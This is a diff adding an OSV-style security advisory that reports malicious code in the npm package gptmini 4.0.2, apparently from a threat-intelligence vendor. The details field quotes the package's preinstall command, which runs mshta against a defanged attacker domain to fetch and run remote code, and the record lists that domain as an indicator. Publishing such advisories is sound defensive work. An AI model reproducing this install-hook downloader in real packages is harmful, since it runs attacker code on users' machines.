@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-6025",
+  "modified": "2026-06-26T18:09:15Z",
+  "published": "2026-06-26T18:08:39Z",
+  "summary": "Malicious code in gptmini (npm)",
+  "details": "Package gptmini@4.0.2 is a trojanized LLM API wrapper that executes a remote downloader during installation. The preinstall hook (node preinstall.js) runs child_process.exec('cmd /c \"mshta hxxp://fixars[.]top\"'), which uses the Windows mshta.exe binary (a known LOLBin) to fetch and execute arbitrary code from fixars[.]top on the installer's machine. The main module appears to be a functional LLM client, masking the malicious install-time behaviour.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "gptmini",
+        "purl": "pkg:npm/gptmini@4.0.2"
+      },
+      "versions": [
+        "4.0.2"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/gptmini/v/4.0.2"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-6025"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-26T18:08:39Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "fixars[.]top"
+        ],
+        "url_observed": [
+          "hxxp://fixars[.]top"
+        ]
+      }
+    }
+  }
+}
